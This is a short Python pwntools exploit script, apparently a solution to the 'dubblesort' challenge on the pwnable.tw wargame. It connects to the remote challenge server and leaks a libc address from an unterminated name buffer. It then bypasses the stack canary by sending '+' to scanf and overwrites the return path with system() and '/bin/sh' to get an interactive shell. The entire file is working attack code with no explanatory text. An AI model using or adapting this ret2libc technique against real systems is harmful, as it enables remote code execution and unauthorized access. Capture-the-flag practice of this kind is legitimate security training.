from pwn import *

exe = ELF('dubblesort_patched', checksec = False)
#r = process(exe.path)
r = remote('chall.pwnable.tw', 10101)
libc = ELF('libc_32.so.6', checksec = False)

#input()
payload = b'a'*25
r.sendafter(b'name :', payload)
r.recvuntil(b'a'*24)
leak = u32(r.recv(4))
log.info("leak address: " + hex(leak))
libc.address = leak - 0xc61
log.info("libc base: " + hex(libc.address))

system = libc.sym['system']
log.info("system: " + hex(system))
bin_sh = next(libc.search(b'/bin/sh'))
log.info("/bin/sh: " + hex(bin_sh))


r.sendlineafter(b'sort :', b'35')
for i in range(24):
    r.sendlineafter(b'number : ', b'1')
r.sendlineafter(b'number : ', b'+')
for i in range(8):
    r.sendlineafter(b'number : ', str(system))
r.sendlineafter(b'number : ', str(bin_sh))
r.sendlineafter(b'number : ', str(bin_sh))

r.interactive()